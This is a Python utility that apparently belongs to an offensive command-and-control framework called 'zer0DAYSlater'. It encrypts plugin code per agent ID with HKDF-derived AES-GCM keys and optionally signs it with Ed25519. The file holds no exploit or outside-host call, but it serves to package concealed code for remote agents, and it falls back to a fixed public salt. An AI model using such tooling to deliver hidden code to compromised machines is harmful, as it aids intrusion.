import base64
import hashlib
import hmac
import json
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


# ── Key derivation ────────────────────────────────────────────────────────────

_HKDF_CONTEXT = b"zer0DAYSlater:plugin-key:v1"


def _hkdf_extract(salt: bytes, ikm: bytes) -> bytes:
    """HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)."""
    return hmac.new(salt, ikm, hashlib.sha256).digest()


def _hkdf_expand(prk: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-Expand: produce `length` bytes of keying material."""
    okm = b""
    t   = b""
    for i in range(1, -(-length // 32) + 1):
        t    = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
    return okm[:length]


def derive_key(agent_id: str) -> bytes:
    """
    Derive a 32-byte AES key from agent_id using HKDF-SHA256.

    IKM:  agent_id bytes
    Salt: ZDS_PLUGIN_SALT env var (hex) or fixed fallback.
          Set ZDS_PLUGIN_SALT to a random 32-byte hex value shared
          between encryptor and agent out-of-band for production use.
    Info: fixed context string — domain-separates plugin keys.

    Replaces agent_id[:32].ljust(32, b"0") — trivially predictable
    from the agent ID alone.
    """
    salt_hex = os.environ.get("ZDS_PLUGIN_SALT", "")
    try:
        salt = bytes.fromhex(salt_hex) if salt_hex else hashlib.sha256(b"zds-default-salt").digest()
    except ValueError:
        salt = hashlib.sha256(b"zds-default-salt").digest()
    prk = _hkdf_extract(salt, agent_id.encode("utf-8"))
    return _hkdf_expand(prk, _HKDF_CONTEXT)
def encrypt_plugin(raw_code: str, agent_id: str, signing_key_b64: str = "") -> str:
    """
    Encrypt and optionally sign a plugin.

    If signing_key_b64 is provided (base64-encoded Ed25519 signing key),
    the decrypted code bytes are signed with SHA256(code) and the signature
    is included in the blob. The loader will reject unsigned plugins when
    ZDS_PLUGIN_PUBKEY is configured.

    Set ZDS_PLUGIN_SIGNING_KEY env var to avoid passing the key on the CLI.
    """
    import hashlib

    key        = derive_key(agent_id)
    nonce      = get_random_bytes(12)
    cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
    code_bytes = raw_code.encode()
    ciphertext, tag = cipher.encrypt_and_digest(code_bytes)

    package = {
        "nonce":      base64.b64encode(nonce).decode(),
        "ciphertext": base64.b64encode(ciphertext).decode(),
        "tag":        base64.b64encode(tag).decode(),
        "signature":  "",
    }

    sk_b64 = signing_key_b64 or os.environ.get("ZDS_PLUGIN_SIGNING_KEY", "")
    if sk_b64:
        try:
            from nacl.signing import SigningKey
            sk     = SigningKey(base64.b64decode(sk_b64))
            digest = hashlib.sha256(code_bytes).digest()
            signed = sk.sign(digest)
            package["signature"] = base64.b64encode(signed.signature).decode()
        except Exception as e:
            print(f"[!] Signing failed: {e} — blob will have empty signature")

    return json.dumps(package)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 4:
        print("Usage: python plugin_encryptor.py <plugin.py> <agent_id> <output.txt> [signing_key_b64]")
        print("       Or set ZDS_PLUGIN_SIGNING_KEY in environment.")
        exit(1)
    plugin_path = sys.argv[1]
    agent_id    = sys.argv[2]
    output_path = sys.argv[3]
    signing_key = sys.argv[4] if len(sys.argv) > 4 else ""
    with open(plugin_path, "r") as f:
        plugin_code = f.read()
    encrypted = encrypt_plugin(plugin_code, agent_id, signing_key_b64=signing_key)
    with open(output_path, "w") as out:
        out.write(encrypted)
    signed = json.loads(encrypted).get("signature", "") != ""
    print(f"[+] Encrypted plugin written to {output_path}")
    print(f"[+] Signed: {signed}")
